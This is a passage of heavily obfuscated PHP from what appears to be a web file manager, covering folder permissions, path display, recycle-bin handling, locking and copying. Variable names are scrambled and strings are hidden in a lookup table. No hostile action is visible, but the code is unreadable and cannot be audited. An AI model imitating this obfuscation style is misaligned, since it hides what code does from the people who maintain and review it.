= AuthModel::authCheckEdit($õœñ†Ùï[$†ùïß×ä[471]][$†ùïß×ä[472]]); $õœñ†Ùï[$†ùïß×ä[223]] = AuthModel::authCheckView($õœñ†Ùï[$†ùïß×ä[471]][$†ùïß×ä[472]]); } $this->groupPathDisplay($õœñ†Ùï); } unset($õœñ†Ùï); } public function _listAppendAuthSecret(&$Ùï÷’ËŞ) { $ì² ’«ï =& $_SERVER[º·Ï‹¥³]; if (Model($ì² ’«ï[492])->get($ì² ’«ï[555]) != $ì² ’«ï[91]) { return; } static $Ş÷Ë™Ÿà = false; if (!$Ş÷Ë™Ÿà) { $üó«äÉ¥ = Model($ì² ’«ï[556]); $†·¤¡Ÿæ = Model($ì² ’«ï[557]); $Ş÷Ë™Ÿà = $†·¤¡Ÿæ->listData(); $Ş÷Ë™Ÿà = array_to_keyvalue($Ş÷Ë™Ÿà, $ì² ’«ï[184]); $Òû”â±Œ = json_decode(Model($ì² ’«ï[492])->get($ì² ’«ï[558]), !0); $Òû”â±Œ = array_to_keyvalue($Òû”â±Œ, $ì² ’«ï[459]); foreach ($Ş÷Ë™Ÿà as $™‰ƒù…ô => $¥‘·ì¸¿) { $ƒ³†öàÀ = $Òû”â±Œ[$¥‘·ì¸¿[$ì² ’«ï[559]]]; if (!$ƒ³†öàÀ) { $†·¤¡Ÿæ->remove($¥‘·ì¸¿[$ì² ’«ï[459]]); unset($Ş÷Ë™Ÿà[$™‰ƒù…ô]); continue; } $Üã¦…ß§ = $üó«äÉ¥->listData($ƒ³†öàÀ[$ì² ’«ï[471]]); if (!$Üã¦…ß§) { $†·¤¡Ÿæ->remove($¥‘·ì¸¿[$ì² ’«ï[459]]); unset($Ş÷Ë™Ÿà[$™‰ƒù…ô]); continue; } $¥‘·ì¸¿[$ì² ’«ï[471]] = $Üã¦…ß§; $¥‘·ì¸¿[$ì² ’«ï[560]] = $ƒ³†öàÀ; $¥‘·ì¸¿[$ì² ’«ï[561]] = Model($ì² ’«ï[562])->getInfoSimpleOuter($¥‘·ì¸¿[$ì² ’«ï[511]]); $Ş÷Ë™Ÿà[$™‰ƒù…ô] = $¥‘·ì¸¿; } } $¶»ÌûÕô = USER_ID; $ÕÈÙ‡ß = array(); $š¿“è¿Ç = $this->_listAppendPath($ÕÈÙ‡ß, !0); foreach ($Ùï÷’ËŞ as $™‰ƒù…ô => &$¥‘·ì¸¿) { if (!is_array($¥‘·ì¸¿[$ì² ’«ï[471]])) { continue; } if ($¥‘·ì¸¿[$ì² ’«ï[181]] != $ì² ’«ï[563]) { continue; } if (isset($Ş÷Ë™Ÿà[$¥‘·ì¸¿[$ì² ’«ï[184]]])) { $Ç÷¥ñ = $Ş÷Ë™Ÿà[$¥‘·ì¸¿[$ì² ’«ï[184]]]; if (!is_array($¥‘·ì¸¿[$ì² ’«ï[523]])) { $¥‘·ì¸¿[$ì² ’«ï[523]] = array(); } $¥‘·ì¸¿[$ì² ’«ï[523]][$ì² ’«ï[564]] = $Ç÷¥ñ[$ì² ’«ï[559]]; $¥‘·ì¸¿[$ì² ’«ï[471]][$ì² ’«ï[565]] = $Ç÷¥ñ; $¥‘·ì¸¿[$ì² ’«ï[471]][$ì² ’«ï[566]] = $¥‘·ì¸¿[$ì² ’«ï[567]]; $¥‘·ì¸¿[$ì² ’«ï[471]][$ì² ’«ï[568]] = $ì² ’«ï[91]; if ($Ç÷¥ñ[$ì² ’«ï[511]] != $¶»ÌûÕô) { $¥‘·ì¸¿[$ì² ’«ï[471]][$ì² ’«ï[472]] = $¥‘·ì¸¿[$ì² ’«ï[471]][$ì² ’«ï[472]] & $Ç÷¥ñ[$ì² ’«ï[471]][$ì² ’«ï[471]]; } continue; } $Ÿ¶Íî±ç = $this->parentLevelArray($¥‘·ì¸¿[$ì² ’«ï[569]]); $ÌşØì†» = array_reverse($Ÿ¶Íî±ç); foreach ($ÌşØì†» as $¸Æúğ«Á => $À¿Ç’¦) { if (!isset($Ş÷Ë™Ÿà[$À¿Ç’¦])) { continue; } $Ç÷¥ñ = $Ş÷Ë™Ÿà[$À¿Ç’¦]; $¥‘·ì¸¿[$ì² ’«ï[471]][$ì² ’«ï[565]] = $Ç÷¥ñ; if ($Ç÷¥ñ[$ì² ’«ï[511]] != $¶»ÌûÕô) { $¥‘·ì¸¿[$ì² ’«ï[471]][$ì² ’«ï[472]] = $¥‘·ì¸¿[$ì² ’«ï[471]][$ì² ’«ï[472]] & $Ç÷¥ñ[$ì² ’«ï[471]][$ì² ’«ï[471]]; } $¤Ã¢Êşº = $ì² ’«ï[12]; $…˜®áÑ€ = count($Ÿ¶Íî±ç) - $¸Æúğ«Á; for ($¾“²¸š = 0; $¾“²¸š < $…˜®áÑ€; $¾“²¸š++) { if (!isset($š¿“è¿Ç[$Ÿ¶Íî±ç[$¾“²¸š]])) { $¤Ã¢Êşº = $ì² ’«ï[12]; break; } $¤Ã¢Êşº = $¤Ã¢Êşº . rtrim($š¿“è¿Ç[$Ÿ¶Íî±ç[$¾“²¸š]], $ì² ’«ï[8]) . $ì² ’«ï[8]; } $¥‘·ì¸¿[$ì² ’«ï[471]][$ì² ’«ï[566]] = rtrim($¤Ã¢Êşº, $ì² ’«ï[8]) . $ì² ’«ï[8]; break; } } unset($¥‘·ì¸¿); } public function groupPathDisplay(&$‰ëº‹ÄØ) { $•²é™•Ğ =& $_SERVER[º·Ï‹¥³]; if ($‰ëº‹ÄØ[$•²é™•Ğ[181]] != self::TYPE_GROUP) { return; } $åëØÊÉŞ = Model($•²é™•Ğ[570])->getInfo($‰ëº‹ÄØ[$•²é™•Ğ[554]]); $«İ©»Ö» = $this->parentLevelArray($åëØÊÉŞ[$•²é™•Ğ[569]]); $¢¦„£Úş = $•²é™•Ğ[12]; foreach ($«İ©»Ö» as $‘Î¹áüè) { $Ş´’… = Model($•²é™•Ğ[570])->getInfo($‘Î¹áüè); $¢¦„£Úş .= $Ş´’…[$•²é™•Ğ[90]][$•²é™•Ğ[184]] . $•²é™•Ğ[50]; } $‰ëº‹ÄØ[$•²é™•Ğ[571]] = $åëØÊÉŞ[$•²é™•Ğ[183]]; $‰ëº‹ÄØ[$•²é™•Ğ[572]] = $åëØÊÉŞ[$•²é™•Ğ[569]]; $‰ëº‹ÄØ[$•²é™•Ğ[573]] = $åëØÊÉŞ[$•²é™•Ğ[574]]; $‰ëº‹ÄØ[$•²é™•Ğ[575]] = $¢¦„£Úş . $åëØÊÉŞ[$•²é™•Ğ[90]][$•²é™•Ğ[184]]; } protected function _listAppendPath(&$ñó‰¸À, $¦Ü½¬²Í = false) { $§åñ¬Şá =& $_SERVER[º·Ï‹¥³]; static $™‰şı“ = array(); $™´Ã«Ç¯ = array(); $ê»Ó½Ø = array(); if ($¦Ü½¬²Í) { return $™‰şı“; } foreach ($ñó‰¸À as &$Á©¬©÷û) { $‘ôÊŸ×¡ = $Á©¬©÷û[$§åñ¬Şá[184]]; if ($Á©¬©÷û[$§åñ¬Şá[469]] == $§åñ¬Şá[91] && $Á©¬©÷û[$§åñ¬Şá[183]] != 0) { $™‰şı“[$‘ôÊŸ×¡] = $Á©¬©÷û[$§åñ¬Şá[32]]; } if ($Á©¬©÷û[$§åñ¬Şá[469]] == $§åñ¬Şá[91] && $Á©¬©÷û[$§åñ¬Şá[183]] == 0) { $™‰şı“[$‘ôÊŸ×¡] = $this->_listAppendPathRoot($Á©¬©÷û, array()); } if (isset($ê»Ó½Ø[$Á©¬©÷û[$§åñ¬Şá[569]]])) { continue; } $ê»Ó½Ø[$Á©¬©÷û[$§åñ¬Şá[569]]] = !0; $œ·”ŒÖ˜ = $this->parentLevelArray($Á©¬©÷û[$§åñ¬Şá[569]]); foreach ($œ·”ŒÖ˜ as $‹ºŸüÕ¶ => $Ó¼şƒ¾½) { if (isset($™‰şı“[$Ó¼şƒ¾½])) { continue; } if ($‹ºŸüÕ¶ == 0) { $™‰şı“[$Ó¼şƒ¾½] = $this->_listAppendPathRoot($Á©¬©÷û, $œ·”ŒÖ˜); } if ($‹ºŸüÕ¶ != 0) { $™´Ã«Ç¯[] = $Ó¼şƒ¾½; } } } unset($Á©¬©÷û); $™´Ã«Ç¯ = array_unique($™´Ã«Ç¯); if (count($™´Ã«Ç¯) > 0) { $÷Á¡‚·ğ = array($§åñ¬Şá[475] => array($§åñ¬Şá[476], $™´Ã«Ç¯)); if (count($™´Ã«Ç¯) == 1) { $ù·Óğ = $this->sourceInfo($™´Ã«Ç¯[0]); $ö®ßÃ‰ = is_array($ù·Óğ) ? array($ù·Óğ) : !1; } else { $ö®ßÃ‰ = $this->field($§åñ¬Şá[576])->where($÷Á¡‚·ğ)->select(); } if (!$ö®ßÃ‰) { $ö®ßÃ‰ = array(); } foreach ($ö®ßÃ‰ as $¿ÄÊ¬Á®) { $™‰şı“[$¿ÄÊ¬Á®[$§åñ¬Şá[184]]] = $¿ÄÊ¬Á®[$§åñ¬Şá[32]]; } } $²ĞµŠÍó = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ñ±“êÛ¡ = array(); foreach ($ñó‰¸À as &$Á©¬©÷û) { $ó‹ìÓøÈ = $Á©¬©÷û[$§åñ¬Şá[569]]; $û—ÙûàØ = $§åñ¬Şá[12]; if (isset($Ñ±“êÛ¡[$ó‹ìÓøÈ])) { $û—ÙûàØ = $Ñ±“êÛ¡[$ó‹ìÓøÈ]; } else { $œ·”ŒÖ˜ = $this->parentLevelArray($Á©¬©÷û[$§åñ¬Şá[569]]); foreach ($œ·”ŒÖ˜ as $‹ºŸüÕ¶ => $Ó¼şƒ¾½) { if (isset($™‰şı“[$Ó¼şƒ¾½])) { $û—ÙûàØ .= $™‰şı“[$Ó¼şƒ¾½] . $§åñ¬Şá[8]; } } $Ñ±“êÛ¡[$ó‹ìÓøÈ] = $û—ÙûàØ; } $û—ÙûàØ .= $Á©¬©÷û[$§åñ¬Şá[32]]; if ($Á©¬©÷û[$§åñ¬Şá[469]] == $§åñ¬Şá[91]) { $û—ÙûàØ .= $§åñ¬Şá[8]; } $Á©¬©÷û[$§åñ¬Şá[567]] = str_replace($§åñ¬Şá[577], $§åñ¬Şá[8], $û—ÙûàØ); if ($Á©¬©÷û[$§åñ¬Şá[183]] == $§åñ¬Şá[219]) { $Á©¬©÷û[$§åñ¬Şá[32]] = trim($™‰şı“[$Á©¬©÷û[$§åñ¬Şá[184]]], $§åñ¬Şá[8]); $Á©¬©÷û[$§åñ¬Şá[567]] = $Á©¬©÷û[$§åñ¬Şá[32]] . $§åñ¬Şá[8]; } if (intval($Á©¬©÷û[$§åñ¬Şá[181]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Á©¬©÷û, $œ·”ŒÖ˜, $²ĞµŠÍó); } } unset($Á©¬©÷û); return $ñó‰¸À; } private function _listAppendPathRecycle(&$Ôåßêõâ, $ç“úÚïÆ, $‚¦ƒ¨¿Ü) { $˜î½Î€é =& $_SERVER[º·Ï‹¥³]; if (!in_array($‚¦ƒ¨¿Ü, $ç“úÚïÆ) && $Ôåßêõâ[$˜î½Î€é[184]] != $‚¦ƒ¨¿Ü) { return; } $À°”ö¬Ó = explode($˜î½Î€é[8], trim($Ôåßêõâ[$˜î½Î€é[567]], $˜î½Î€é[8])); $°Ã¬Àå = implode($˜î½Î€é[8], array_slice($À°”ö¬Ó, 2)); $Ôåßêõâ[$˜î½Î€é[567]] = $˜î½Î€é[8] . LNG($˜î½Î€é[578]) . $˜î½Î€é[8] . ltrim($°Ã¬Àå, $˜î½Î€é[8]); $Ôåßêõâ[$˜î½Î€é[569]] = $˜î½Î€é[579] . implode($˜î½Î€é[50], array_slice($ç“úÚïÆ, 1)) . $˜î½Î€é[50]; if ($Ôåßêõâ[$˜î½Î€é[184]] == $‚¦ƒ¨¿Ü) { $Ôåßêõâ[$˜î½Î€é[569]] = $˜î½Î€é[579]; $Ôåßêõâ[$˜î½Î€é[183]] = $˜î½Î€é[219]; $Ôåßêõâ[$˜î½Î€é[32]] = LNG($˜î½Î€é[578]); } $Ôåßêõâ[$˜î½Î€é[580]] = $˜î½Î€é[581]; } protected function _listAppendPathRoot(&$ëöĞÏ ş, $ªèÕÖ‹») { $ÑÕ‡½÷ =& $_SERVER[º·Ï‹¥³]; static $¸Œ¶‚½ç = false; $¾ºò×Œ = $ÑÕ‡½÷[12]; if ($ëöĞÏ ş[$ÑÕ‡½÷[181]] == self::TYPE_USER) { if ($ëöĞÏ ş[$ÑÕ‡½÷[554]] == USER_ID) { $¾ºò×Œ = LNG($ÑÕ‡½÷[582]); if ($¸Œ¶‚½ç === !1) { $íÊ§ÛÉ” = Model($ÑÕ‡½÷[583])->getInfoFull(USER_ID); $¸Œ¶‚½ç = _get($íÊ§ÛÉ”, $ÑÕ‡½÷[584], $ÑÕ‡½÷[12]); } if ($ªèÕÖ‹» && $ªèÕÖ‹»[0] == $¸Œ¶‚½ç || !$ªèÕÖ‹» && $ëöĞÏ ş[$ÑÕ‡½÷[184]] == $¸Œ¶‚½ç) { $¾ºò×Œ = LNG($ÑÕ‡½÷[585]); $ëöĞÏ ş[$ÑÕ‡½÷[586]] = $ÑÕ‡½÷[587]; } if (!$ªèÕÖ‹») { $ëöĞÏ ş[$ÑÕ‡½÷[32]] = $¾ºò×Œ; } } else { $ëöĞÏ ş[$ÑÕ‡½÷[588]] = Model($ÑÕ‡½÷[562])->getInfoSimpleOuter($ëöĞÏ ş[$ÑÕ‡½÷[554]]); $¾ºò×Œ = LNG($ÑÕ‡½÷[589]) . $ÑÕ‡½÷[166] . $ëöĞÏ ş[$ÑÕ‡½÷[588]][$ÑÕ‡½÷[32]] . $ÑÕ‡½÷[168]; } } else { if ($ëöĞÏ ş[$ÑÕ‡½÷[181]] == self::TYPE_GROUP) { $¿‡­‰¦ = Model($ÑÕ‡½÷[570])->getInfoSimple($ëöĞÏ ş[$ÑÕ‡½÷[554]]); $¾ºò×Œ = $¿‡­‰¦[$ÑÕ‡½÷[32]]; } else { if ($ëöĞÏ ş[$ÑÕ‡½÷[181]] == self::TYPE_SYSTEM) { $¾ºò×Œ = $ÑÕ‡½÷[590]; } } } $¾ºò×Œ = $¾ºò×Œ ? $ÑÕ‡½÷[8] . $¾ºò×Œ . $ÑÕ‡½÷[8] : $ÑÕ‡½÷[8]; return $¾ºò×Œ; } protected function _listAppendUser(&$¸€¬ùÄì) { $­İ—‹Ş =& $_SERVER[º·Ï‹¥³]; $‚¿é‡… = array_to_keyvalue($¸€¬ùÄì, $­İ—‹Ş[12], $­İ—‹Ş[511]); $í¬ş®¸Î = array_to_keyvalue($¸€¬ùÄì, $­İ—‹Ş[12], $­İ—‹Ş[513]); $ÔÜ—¶Ó = array_merge($‚¿é‡…, $í¬ş®¸Î); $Ÿ¢íØ = Model($­İ—‹Ş[583])->userListInfo($ÔÜ—¶Ó); foreach ($¸€¬ùÄì as &$§µİßï) { $ÈÛ´Ÿ°Û = $§µİßï[$­İ—‹Ş[511]]; $§µİßï[$­İ—‹Ş[511]] = $Ÿ¢íØ[$ÈÛ´Ÿ°Û] ? $Ÿ¢íØ[$ÈÛ´Ÿ°Û] : !1; $ÈÛ´Ÿ°Û = $§µİßï[$­İ—‹Ş[513]]; $§µİßï[$­İ—‹Ş[513]] = $Ÿ¢íØ[$ÈÛ´Ÿ°Û] ? $Ÿ¢íØ[$ÈÛ´Ÿ°Û] : !1; if (isset($§µİßï[$­İ—‹Ş[523]]) && $§µİßï[$­İ—‹Ş[523]][$­İ—‹Ş[591]]) { $½†˜…Àì = $GLOBALS[$­İ—‹Ş[6]][$­İ—‹Ş[92]][$­İ—‹Ş[592]]; if ($§µİßï[$­İ—‹Ş[523]][$­İ—‹Ş[593]] <= time() - $½†˜…Àì) { $this->metaSet($§µİßï[$­İ—‹Ş[184]], $­İ—‹Ş[591], null); $this->metaSet($§µİßï[$­İ—‹Ş[184]], $­İ—‹Ş[593], null); unset($§µİßï[$­İ—‹Ş[523]][$­İ—‹Ş[591]]); continue; } $Äã‹®ÊÄ = $§µİßï[$­İ—‹Ş[523]][$­İ—‹Ş[591]]; $§µİßï[$­İ—‹Ş[523]][$­İ—‹Ş[594]] = Model($­İ—‹Ş[583])->getInfoSimpleOuter($Äã‹®ÊÄ); } } unset($§µİßï); } public function parentLevelArray($§±„™¢) { $Ü‘”Ÿ¤ª =& $_SERVER[º·Ï‹¥³]; $§±„™¢ = explode($Ü‘”Ÿ¤ª[50], trim($§±„™¢, $Ü‘”Ÿ¤ª[50])); return array_remove_value($§±„™¢, $Ü‘”Ÿ¤ª[219]); } public function listAll($ÄÓö®ú) { $çõ™¼° =& $_SERVER[º·Ï‹¥³]; $ÒùéåÆ° = $this->sourceInfo($ÄÓö®ú); $“È¼çà“ = array($çõ™¼°[595] => array($çõ™¼°[596], $ÒùéåÆ°[$çõ™¼°[569]] . $ÄÓö®ú . $çõ™¼°[597]), $çõ™¼°[598] => 0); $é¬ÁòÈ = $çõ™¼°[599]; $†ò™™· = "\114\105\x46\124\40\x4a\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\137\146\151\x6c\145\x20\x66\x69\x6c\x65\40\157\156\x20\163\x6f\x75\x72\143\145\x2e\146\151\154\145\x49\104\x20\x3d\x20\x66\x69\154\x65\x2e\x66\x69\x6c\x65\111\x44"; $¿ôïÁìœ = $this->alias($çõ™¼°[503])->field($é¬ÁòÈ)->where($“È¼çà“)->join($†ò™™·)->select(); $this->_listAppendAuth($¿ôïÁìœ); $this->_listAppendUser($¿ôïÁìœ); $this->_listAppendPath($¿ôïÁìœ); $¿ôïÁìœ = array_to_keyvalue($¿ôïÁìœ, $çõ™¼°[184]); $­†ÁÃ§ = "\57{$ÒùéåÆ°[$çõ™¼°[32]]}\57"; $­†ÁÃ§ = $­†ÁÃ§ == $çõ™¼°[577] ? $çõ™¼°[8] : $­†ÁÃ§; $Ãá±ä»¬ = array(); foreach ($¿ôïÁìœ as $‡Ú…­Å“ => $î¹õÖÒ) { $Ã–°÷¼Š = $this->parentLevelArray($î¹õÖÒ[$çõ™¼°[569]]); array_shift($Ã–°÷¼Š); $çäÀßÇ· = $­†ÁÃ§; for ($‚•ãÈ’Ó = 0; $‚•ãÈ’Ó < count($Ã–°÷¼Š); $‚•ãÈ’Ó++) { $çäÀßÇ· .= $¿ôïÁìœ[$Ã–°÷¼Š[$‚•ãÈ’Ó]][$çõ™¼°[32]] . $çõ™¼°[8]; } $çäÀßÇ· .= $î¹õÖÒ[$çõ™¼°[32]]; if ($î¹õÖÒ[$çõ™¼°[469]]) { $çäÀßÇ· .= $çõ™¼°[8]; } $×ŸÅ˜Úº = array($çõ™¼°[479] => str_replace($çõ™¼°[577], $çõ™¼°[8], str_replace($çõ™¼°[577], $çõ™¼°[8], str_replace($çõ™¼°[577], $çõ™¼°[8], $çäÀßÇ·))), $çõ™¼°[600] => intval($î¹õÖÒ[$çõ™¼°[469]]), $çõ™¼°[601] => intval($î¹õÖÒ[$çõ™¼°[79]]), $çõ™¼°[88] => intval($î¹õÖÒ[$çõ™¼°[88]]), $çõ™¼°[90] => $this->pathInfoFilter($î¹õÖÒ)); if (!$×ŸÅ˜Úº[$çõ™¼°[469]]) { $×ŸÅ˜Úº[$çõ™¼°[525]] = $î¹õÖÒ[$çõ™¼°[525]]; } $Ãá±ä»¬[] = $×ŸÅ˜Úº; } $Ãá±ä»¬ = array_sort_by($Ãá±ä»¬, $çõ™¼°[87]); return $Ãá±ä»¬; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ß³×æÏà) { $Üö’İË¾ =& $_SERVER[º·Ï‹¥³]; if (!$this->allowLock()) { return; } $this->_lockCheck($Üö’İË¾[602], $ß³×æÏà); $”äÏŞ¶ö = 1; $this->_lockEvent($ß³×æÏà, array($Üö’İË¾[603], $Üö’İË¾[604]), $”äÏŞ¶ö); $this->_lockParent($ß³×æÏà, array($Üö’İË¾[604]), $”äÏŞ¶ö); $this->_lockEvent($ß³×æÏà, array($Üö’İË¾[605], $Üö’İË¾[606]), $”äÏŞ¶ö); $this->_lockCheckEnd($Üö’İË¾[602], $ß³×æÏà); } public function lockCopyEnd($ìÅäõÚ) { $óí‡¢›Á =& $_SERVER[º·Ï‹¥³]; if (!$this->allowLock()) { return; } $‹åªÖ¡ = 0; $this->_lockEvent($ìÅäõÚ, array($óí‡¢›Á[603], $óí‡¢›Á[604]), $‹åªÖ¡); $this->_lockParent($ìÅäõÚ, array($óí‡¢›Á[604]), $‹åªÖ¡); $this->_lockEvent($ìÅäõÚ, array($óí‡¢›Á[605], $óí‡¢›Á[606]), $‹åªÖ¡); } public function lockWriteStart($ªåö’¨¯, $…ÒÃÓ˜Ü = '') { $¥ÀûİÒå =& $_SERVER[º·Ï‹¥³]; if (!$this->allowLock()) { return; } $this->_lockCheck($¥ÀûİÒå[603], $ªåö’¨¯); $¢˜¯Ï¿ú = 1; $this->_lockKey($¥ÀûİÒå[607] . $ªåö’¨¯ . $¥ÀûİÒå[10] . $…ÒÃÓ˜Ü, $¢˜¯Ï¿ú); $this->_lockEvent($ªåö’¨¯, array($¥ÀûİÒå[602], $¥ÀûİÒå[604]), $¢˜¯Ï¿ú); $this->_lockParent($ªåö’¨¯, array($¥ÀûİÒå[602], $¥ÀûİÒå[604]), $¢˜¯Ï¿ú); $this->_lockCheckEnd($¥ÀûİÒå[603], $ªåö’¨¯); } public function lockWriteEnd($‘ì‚ù¥œ, $±Ç¥ ¶ê = '') { $÷Æ’…¡­ =& $_SERVER[º·Ï‹¥³]; if (!$this->allowLock()) { return; } $•Ÿåå«£ = 0; $this->_lockKey($÷Æ’…¡­[607] . $‘ì‚ù¥œ . $÷Æ’…¡­[10] . $±Ç¥ ¶ê, $•Ÿåå«£); $this->_lockEvent($‘ì‚ù¥œ, array($÷Æ’…¡­[602], $÷Æ’…¡­[604]), $•Ÿåå«£); $this->_lockParent($‘ì‚ù¥œ, array($÷Æ’…¡­[602], $÷Æ’…¡­[604]), $•Ÿåå«£); } public function lockMoveStart($×ä×ƒ¤) { $ ¹Ş„§ë =& $_SERVER[º·Ï‹¥³]; if (!$this->allowLock()) { return; } $this->_lockCheck($ ¹Ş„§ë[604], $×ä×ƒ¤); $Ÿµ¸Ú˜ù = 1; $this->_lockKey($ ¹Ş„§ë[608] . $×ä×ƒ¤, $Ÿµ¸Ú˜ù); $this->_lockEvent($×ä×ƒ¤, array($ ¹Ş„§ë[602], $ ¹Ş„§ë[603]), $Ÿµ¸Ú˜ù); $this->_lockParent($×ä×ƒ¤, array($ ¹Ş„§ë[602], $ ¹Ş„§ë[604]), $Ÿµ¸Ú˜ù); $this->_lockEvent($×ä×ƒ¤, array($ ¹Ş„§ë[609], $ ¹Ş„§ë[605], $ ¹Ş„§ë[606]), $Ÿµ¸Ú˜ù); $this->_lockCheckEnd($ ¹Ş„§ë[604], $×ä×ƒ¤); } public function lockMoveEnd($¤ø×Ê¿Ú) { $’®øËşÔ =& $_SERVER[º·Ï‹¥³]; if (!$this->allowLock()) { return; } $¸È©’‡Æ = 0; $this->_lockKey($’®øËşÔ[608] . $¤ø×Ê¿Ú, $¸È©’‡Æ); $this->_lockEvent($¤ø×Ê¿Ú, array($’®øËşÔ[602], $’®øËşÔ[603]), $¸È©’‡Æ); $this->_lockParent($¤ø×Ê¿Ú, array($’®øËşÔ[602], $’®øËşÔ[604]), $¸È©’‡Æ); $this->_lockEvent($¤ø×Ê¿Ú, array($’®øËşÔ[609], $’®øËşÔ[605], $’®øËşÔ[606]), $¸È©’‡Æ); } private function _lockCheck($‹à–ãá£, $û¼Îá¤ˆ) { $ˆÄş·Œ =& $_SERVER[º·Ï‹¥³]; $ÖÛœŠ™Ê = $this->sourceInfo($û¼Îá¤ˆ); $¨µà©‘ = $‹à–ãá£ . $ˆÄş·Œ[10] . $û¼Îá¤ˆ; $this->_lockTimeStart[$¨µà©‘] = timeFloat(); if (!is_array($ÖÛœŠ™Ê)) { return; } $ÎÑşÆ…€ = LNG($ˆÄş·Œ[610]); CacheLock::setErrorMsg($ˆÄş·Œ[166] . htmlspecialchars($ÖÛœŠ™Ê[$ˆÄş·Œ[32]]) . $ˆÄş·Œ[168] . $ÎÑşÆ…€); $this->_lockKey($¨µà©‘, 1); $this->_lockKey($¨µà©‘, 0); $·ŠÄ¹¯Ç = array_reverse($this->parentLevelArray($ÖÛœŠ™Ê[$ˆÄş·Œ[569]])); foreach ($·ŠÄ¹¯Ç as $ŞÜĞª˜) { $¨µà©‘ = $‹à–ãá£ . $ˆÄş·Œ[611] . $ŞÜĞª˜; if (CacheLock::lockGet($ˆÄş·Œ[612] . $¨µà©‘)) { $ÖÛœŠ™Ê = $this->sourceInfo($ŞÜĞª˜); CacheLock::setErrorMsg($ˆÄş·Œ[166] . htmlspecialchars($ÖÛœŠ™Ê[$ˆÄş·Œ[32]]) . $ˆÄş·Œ[168] . $ÎÑşÆ…€); $this->_lockKey($¨µà©‘, 1); $this->_lockKey($¨µà©‘, 0); } } } private function _lockCheckEnd($Ø¨ß´ƒ­, $ê•úÂ°É) { $´ÂÌÖù =& $_SERVER[º·Ï‹¥³]; $¥¸âïÅ = $Ø¨ß´ƒ­ . $´ÂÌÖù[10] . $ê•úÂ°É; CacheLock::setErrorMsg($´ÂÌÖù[438]); if (!isset($this->_lockTimeStart[$¥¸âïÅ])) { return; } $Ø‘Íà‡Õ = timeFloat() - $this->_lockTimeStart[$¥¸âïÅ]; unset($this->_lockTimeStart[$¥¸âïÅ]); if ($Ø‘Íà‡Õ > 0.5) { unset(self::$cacheSourceInfo[$´ÂÌÖù[517] . $ê•úÂ°É]); } $šçğØçŠ = $this->sourceInfo($ê•úÂ°É); if (!$šçğØçŠ) { show_json(LNG($´ÂÌÖù[108]), !1); } } private function _lockParent($ãø‡Öİº, $ØšÌµ»ë, $¿ãœÈî) { if (!$this->autoLockSet) { return; } $¢Õ™Î„’ = $this->sourceInfo($ãø‡Öİº); if (!is_array($¢Õ™Î„’)) { return; } $¹ôÚçÇ = array_reverse($this->parentLevelArray($¢Õ™Î„’[$_SERVER[º·Ï‹¥³][569]])); foreach ($¹ôÚçÇ as $©Œ·¾Ôà) { $this->_lockEvent($©Œ·¾Ôà, $ØšÌµ»ë, $¿ãœÈî); } } private function _lockEvent($šİ¨€´°, $´¼»ÉÏ, $İ›Á•¬ï) { $·¼Å¾‘— =& $_SERVER[º·Ï‹¥³]; if (!$this->autoLockSet) { return; } foreach ($´¼»ÉÏ as $µæ¢“ğÑ) { $ÆìÅáúŒ = $µæ¢“ğÑ . $·¼Å¾‘—[10] . $šİ¨€´°; if ($İ›Á•¬ï && CacheLock::lockGet($·¼Å¾‘—[612] . $ÆìÅáúŒ)) { continue; } $this->_lockKey($ÆìÅáúŒ, $İ›Á•¬ï); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ïõ³‘Õ—, $›û¡¦Ûµ = 1) { $¥“•ĞŠ = $_SERVER[º·Ï‹¥³][612] . md5($ïõ³‘Õ—); if ($›û¡¦Ûµ) { if (isset(self::$_lockItemArr[$¥“•ĞŠ])) { return; } self::$_lockItemArr[$¥“•ĞŠ] = 1; CacheLock::lock($¥“•ĞŠ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¥“•ĞŠ])) { return; } unset(self::$_lockItemArr[$¥“•ĞŠ]); CacheLock::unlock($¥“•ĞŠ); } } public function isParentOf($…àÁ‚Âü, $ˆ’Û—Î‚) { $¬ßÂ•æ =& $_SERVER[º·Ï‹¥³]; $ì®„ù¦ = $this->sourceInfo($…àÁ‚Âü); $ñĞ¡ıÀ = $this->sourceInfo($ˆ’Û—Î‚); $²¨åâ® = $ì®„ù¦[$¬ßÂ•æ[569]] . $ì®„ù¦[$¬ßÂ•æ[184]] . $¬ßÂ•æ[50]; $¢Õû = $ñĞ¡ıÀ[$¬ßÂ•æ[569]] . $ñĞ¡ıÀ[$¬ßÂ•æ[184]] . $¬ßÂ•æ[50]; $ÙÇÜÚ‹á = strpos($¢Õû, $²¨åâ®) === 0; return $ÙÇÜÚ‹á; } private $targetIsDelete = 0; public function copy($Ìˆ¤„â‘, $ò´ÊÅ¤Å, $µ’¿Ú = REPEAT_REPLACE, $”‚ˆËíØ = '') { $­Ö¾ŒØÚ =& $_SERVER[º·Ï‹¥³]; $ˆùôèº¥ = $this->sourceInfo($Ìˆ¤„â‘); $Ò¯³•ÈÇ = $this->sourceInfo($ò´ÊÅ¤Å); if (!$ˆùôèº¥ || !$Ò¯³•ÈÇ || $Ò¯³•ÈÇ[$­Ö¾ŒØÚ[469]] != $­Ö¾ŒØÚ[91]) { return !1; } if ($this->isParentOf($Ìˆ¤„â‘, $ò´ÊÅ¤Å)) { return !1; } $ú—’¥µØ = $”‚ˆËíØ ? $”‚ˆËíØ : $ˆùôèº¥[$­Ö¾ŒØÚ[32]]; $this->lockCopyStart($Ìˆ¤„â‘); $this->lockWriteStart($ò´ÊÅ¤Å, $ú—’¥µØ); $Éã¹—¨ = array($­Ö¾ŒØÚ[613] => array(), $­Ö¾ŒØÚ[614] => array(), $­Ö¾ŒØÚ[615] => array()); $this->targetIsDelete = intval($ˆùôèº¥[$­Ö¾ŒØÚ[489]]); $¨ú ‘¦û = $this->fileNameExistAuto($ò´ÊÅ¤Å, $ˆùôèº¥); $¨„Á¹ƒ = $this->_copy($Ìˆ¤„â‘, $ò´ÊÅ¤Å, $µ’¿Ú, $Éã¹—¨, !0, $”‚ˆËíØ); $this->_childrenListClear(); $this->lockCopyEnd($Ìˆ¤„â‘); $this->lockWriteEnd($ò´ÊÅ¤Å, $ú—’¥µØ); if 